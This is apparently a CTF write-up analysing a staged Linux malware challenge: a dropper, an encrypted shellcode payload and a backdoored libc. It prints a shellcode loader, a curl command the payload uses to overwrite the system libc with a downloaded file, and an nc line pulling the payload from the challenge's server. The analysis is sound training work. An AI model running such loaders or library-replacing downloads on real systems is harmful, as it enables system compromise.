---
date: 2025-06-11 7:00:00
categories:
  - ctf
  - reverse engineering
title: Cybergame 2025 Writeups
tags:
  - forensics
  - reverseengineering
image: /assets/img/cybergame.png
description: Writeups for the CyberGame2025 CTF
---
I participated in **CyberGame 2025** and secured **1st place** ðŸ¥‡.   Out of 73 challenges, I solved **71**, with **52 first bloods** ðŸ©¸
![image](https://gist.github.com/user-attachments/assets/3dbb099e-da02-455a-b608-7952b96faad2)


The game featured a wide variety of categories, including:

- **Web Exploitation & Binary Exploitation**
    
- **Forensics**
    
- **OSINT (Open Source Intelligence)**
    
- **Cryptography**
    
- **Malware Analysis & Reverse Engineering**
    
- **Process and Governance**
    
- **PyJails** _(as part of the JAILE series)

Here are writeups for challenges I found interesting
## [â˜…â˜…â˜†] The Chronicles of Greg

### SystemUpdate incident report

Description

>Greg didnâ€™t ask for this. Greg wanted a quiet Friday, maybe a donut, and ideally no malware. But no. Instead, Greg found logsâ€”weird logs. And when Greg sees weird logs, Greg investigates. This is Gregâ€™s story.

############

Analyst Log â€“ 09:14 AM: "They called it a 'low-priority anomaly.' Said it was probably nothing. Thatâ€™s what they always  
say before things explode". I ran strings on the fileâ€”didnâ€™t like what I saw. Not an update. Not even ransomware. Justâ€¦  
vibes. Binary vibes. Theyâ€™ve named it internally â€˜SystemUpdate.â€™ I donâ€™t know why. No update was done. Iâ€™m not even sure  
if this is about system update anymore.

############

##### Solution

On analysing the `system_update`Â  binary I found subroutine `sub_20C0` had suspicious encodings that I wrote a script to decode 
```python
def solve():
    target = [int(x, 16) for x in "F9 FF 8F E0 EA C6 FE 2A CC 9D E6 9A 92 D3 C4 CB 20 E1 DF D7 95 E0 CC 2F".split()]
    ops = [
        (1, 0xF8), (1, 0xEE), (2, None), (3, 0xA3), (1, 0xFB),
        (1, 0xEC), (1, 0xF6), (1, 0xF1), (1, 0xF7), (1, 0xF4),
        (1, 0xF1), (1, 0xFD), (3, 0xA3), (1, 0xFD), (3, 0xA3),
        (1, 0xF6), (1, 0xEC), (1, 0xF1), (1, 0xFC), (1, 0xF7),
        (1, 0xF9), (1, 0xF0), (1, 0xF4), (1, 0xF0)
    ]

    flag = []
    for i in range(24):
        op, k = ops[i]
        t = target[i]
        if op == 1:
            c = (k - (t ^ 0x5C)) & 0xFF
        elif op == 2:
            c = (- (t ^ 0x5C)) & 0xFF
        elif op == 3:
            c = (t ^ k) & 0xFF
        flag.append(chr(c))

    s = ''.join(flag)
    print(s)

    # verify
    check = []
    for i in range(24):
        op, k = ops[i]
        c = ord(s[i])
        if op == 1:
            o = ((k - c) & 0xFF) ^ 0x5C
        elif op == 2:
            o = ((-c) & 0xFF) ^ 0x5C
        elif op == 3:
            o = c ^ k
        check.append(o & 0xFF)

    if check == target:
        print("ok")
    else:
        print("fail")

if __name__ == "__main__":
    solve()

```

```
SK-CERT{g3771ng_p4yl04d}
```

### The Blob Whisperer


Description

>Analyst Log â€“ 12:47 PM: The blob showed up after SystemUpdate did its thing. Just a data. No extension. No metadata. No readme. No hope. The problem? There. Is. No. Key. Iâ€™ve tried dictionary attacks, rainbow tables, entropy analysis, even feeding it to a very confused intern. Nothingâ€¦ At one point, I shouted my Wi-Fi password at the screen out of raw frustration. Didnâ€™t help, but I felt better for two seconds. I thought I saw a familiar pattern in the entropy graph. Turns out it was just a coffee stain on my monitor. This isnâ€™t just encryption. This is a test of character. And Greg? Greg is not winning.

Solution

WhenÂ `system_update`Â is run with a parameter it connects to a remote server and sends the value of that parameter.

If the value is wrong, then it get a basic command back likeÂ `COMMAND: apt update`.

Running strings on the binary we get an `ip` address and  basically I did an `strace` and found the `ip` and port the binary connects to 

```python
connect(3, {sa_family=AF_INET, sin_port=htons(7052), sin_addr=inet_addr("195.168.112.4")}, 16) = 0
```

If the value is the  flag `SK-CERT{g3771ng_p4yl04d}` we got in the first part then it gets aÂ payload that is encrypted  
![image](https://gist.github.com/user-attachments/assets/0b6bf238-e7b6-450a-beb2-b0417f612c0c)


Function `sub_1D20` does the decryption of the payload 

```python
__int64 __fastcall sub_1D20(__int64 a1, unsigned int a2)
{
  __int64 v2; // r14
  unsigned int v3; // eax
  __int64 v4; // r14
  __int64 v5; // rax
  int v6; // ebx
  int v7; // ebx
  void *v8; // rax
  void (*v9)(void); // rax
  int v11; // [rsp+Ch] [rbp-105Ch] BYREF
  _BYTE v12[16]; // [rsp+10h] [rbp-1058h] BYREF
  _BYTE v13[16]; // [rsp+20h] [rbp-1048h] BYREF
  _BYTE src[4152]; // [rsp+30h] [rbp-1038h] BYREF

  v2 = 0;
  v3 = sub_1C30("/lib/x86_64-linux-gnu/libc.so.6");
  srand(v3);
  do
  {
    v12[v2] = rand() % 256;
    v13[v2++] = rand() % 256;
  }
  while ( v2 != 16 );
  v4 = EVP_CIPHER_CTX_new();
  v5 = EVP_aes_128_cbc();
  EVP_DecryptInit_ex(v4, v5, 0, v12, v13);
  EVP_DecryptUpdate(v4, src, &v11, a1, a2);
  v6 = v11;
  if ( (int)EVP_DecryptFinal_ex(v4, &src[v11], &v11) <= 0 )
  {
    EVP_CIPHER_CTX_free(v4);
  }
  else
  {
    v7 = v11 + v6;
    EVP_CIPHER_CTX_free(v4);
    if ( v7 >= 0 )
    {
      src[v7] = 0;
      v8 = mmap(0, (int)a2, 7, 34, -1, 0);
      if ( v8 != (void *)-1LL )
      {
        v9 = (void (*)(void))memcpy(v8, src, v7);
        v9();
        return 0;
      }
      perror("mmap");
    }
  }
  return 1;
}
```

The key to this encryption is generated byÂ `rand()`Â that is seeded byÂ `srand()`Â with a seed derived from a major/minor version of current LIBC.

We notice the first 5 bytes of the payload are discarded. I removed the 5 bytes from the saved payload then bruteforced the seed using a c script and found version 2.38 was the correct version.


```python
echo "SK-CERT{g3771ng_p4yl04d}" | nc 195.168.112.4 7052  > payload.bin
```


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

unsigned int gen_seed(unsigned int major, unsigned int minor) {
    unsigned int val = (major << 16) | (minor << 8) | (major ^ minor);
    val = (val ^ (val >> 13)) * 0x5bd1e995;
    return val ^ (val >> 15);
}

int decrypt(const char* in_file, const char* out_file, unsigned int seed) {
    FILE* f = fopen(in_file, "rb");
    if (!f) return -1;

    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* enc = malloc(len);
    fread(enc, 1, len, f);
    fclose(f);

    unsigned char key[16], iv[16];
    srand(seed);
    for (int i = 0; i < 16; i++) {
        key[i] = rand() & 0xFF;
        iv[i] = rand() & 0xFF;
    }

    unsigned char* dec = malloc(len + AES_BLOCK_SIZE);
    int l, dec_len;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, dec, &l, enc, len);
    dec_len = l;

    if (EVP_DecryptFinal_ex(ctx, dec + l, &l) > 0) {
        dec_len += l;
        FILE* out = fopen(out_file, "wb");
        if (out) {
            fwrite(dec, 1, dec_len, out);
            fclose(out);
            printf("[+] %s ok\n", out_file);
        }
    } else {
        printf("[-] %s fail\n", out_file);
    }

    EVP_CIPHER_CTX_free(ctx);
    free(enc);
    free(dec);
    return 0;
}

int main() {
    const char* infile = "payload.bin";
    char outfile[256];

    for (unsigned int major = 2; major <= 2; major++) {
        for (unsigned int minor = 21; minor <= 41; minor++) {
            unsigned int seed = gen_seed(major, minor);
            snprintf(outfile, sizeof(outfile), "%u.%u_deciphered.bin", major, minor);
            decrypt(infile, outfile, seed);
        }
    }

    return 0;
}

```


Checking the decrypted payload
![image](https://gist.github.com/user-attachments/assets/dc18c9c7-0162-4e1b-8806-aedcf308b24e)

We see interesting strings `/tmp/s` `/bin/s` indicating its a shellcode I mapped the shellcode to memory running it and checking the `tmp` directory we confirm it copied contents there

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    FILE *f = fopen("2.38_deciphered.bin", "rb");
    if (!f) { perror("open"); return 1; }

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);

    char *buf = malloc(sz);
    if (!buf) { perror("malloc"); fclose(f); return 1; }

    if (fread(buf, 1, sz, f) != sz) {
        perror("read");
        free(buf);
        fclose(f);
        return 1;
    }
    fclose(f);

    void *mem = mmap(0, sz, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        free(buf);
        return 1;
    }

    memcpy(mem, buf, sz);
    free(buf);

    printf(">> running shellcode...\n");
    ((void(*)())mem)();

    munmap(mem, sz);
    return 0;
}

```



![image](https://gist.github.com/user-attachments/assets/77c13b5b-68b1-40d0-8d11-bf0a8745191d)

```python
curl http://files.cybergame.sk/systemupdate-2b174d89-564b-4024-acb6-b195f4c81a3c/lib.so#SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5} > /lib_safe/x86_64-linux-gnu/libc.so.6                                                            
```

```
SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5}
```

### The Shared Object Prophecy

Description

>Analyst Log â€“ 17:23 PM: I followed the execution trail. It ended in the most cursed way imaginable: custom libc. Who  
writes their own libc? What kind of monster wakes up and chooses that? Greg is tired. Greg is afraid. Greg wants his  
weekend back.

Solution

From the libc.so we got from the previous part and with the description given I knew it was a custom or modified libc.so so I decided to reverse it. After hours and hours of checking the disassembly I decided to check the usual or rather obvious functions and found `_GI___libc_write` was modified with extra patterns of what looked like encryptions 

Through this script I reversed the operations and recovered the flag and the ip address it connects to 

```python
def s1(buf):
    if len(buf) != 29:
        raise ValueError("s1: bad len")
    out = bytearray(29)

    for i in range(29):
        x = buf[i] ^ i
        x = ~x & 0xFF
        x = (x - i) & 0xFF
        x = (x ^ i) & 0xFF
        x = (x + i) & 0xFF
        x = ((x << 3) | (x >> 5)) & 0xFF

        x = (-((x + i) & 0xFF) ^ i) & 0xFF
        x = (x - i) & 0xFF
        x = (x ^ i) & 0xFF

        t = ((x - 0x7F) ^ 0x74) & 0xFF
        out[i] = (i - t) & 0xFF

    return out

def s2(buf):
    if len(buf) != 14:
        raise ValueError("s2: bad len")
    out = bytearray(14)

    for i in range(14):
        x = buf[i]
        x = (x + i) & 0xFF
        x = (x ^ i) & 0xFF
        x = (x + 99) & 0xFF
        x = (x ^ i) & 0xFF
        x = (x + 0x78) & 0xFF
        x = (x ^ 0x7F) & 0xFF
        x = (x + i) & 0xFF
        x = (-x) & 0xFF
        x = (x ^ 0xE0) & 0xFF
        x = ((x << 1) | (x >> 7)) & 0xFF

        term1 = (x ^ i) & 0xFF
        term2 = (0x2C - i) & 0xFF
        out[i] = (term1 + term2) & 0xFF

    return out

def main():
    s = bytes([
        0xea, 0x06, 0xe0, 0x44, 0x23, 0x20, 0x96, 0xcc,
        0x1e, 0xae, 0x64, 0xe3, 0x00, 0x09, 0xeb, 0x27,
        0xd5, 0xd7, 0xac, 0x81, 0xea, 0xd5, 0x5e, 0xdf,
        0x5a, 0xae, 0x2c, 0x14, 0xfc
    ])

    s2_buf = bytes([
        0x06, 0x09, 0x0c, 0x85, 0x12, 0x8f, 0x82, 0x81,
        0x16, 0x15, 0x91, 0x85, 0x90, 0x3c
    ])

    t1 = s1(s)
    print("s1:", t1.hex())
    try:
        print("s1_ascii:", t1.decode(errors='replace'))
    except Exception as e:
        print("s1 decode error:", e)

    print("-" * 30)

    t2 = s2(s2_buf)
    print("s2:", t2.hex())
    try:
        s2_ascii = t2.split(b'\x00', 1)[0].decode(errors='replace')
        print("s2_ascii:", s2_ascii)
    except Exception as e:
        print("s2 decode error:", e)

if __name__ == "__main__":
    main()

```

![image](https://gist.github.com/user-attachments/assets/5191c34f-5ac4-43b1-b10e-ff2d21842f95)

```python
SK-CERT{br1n6_y0ur_0wn_l1bc}
```

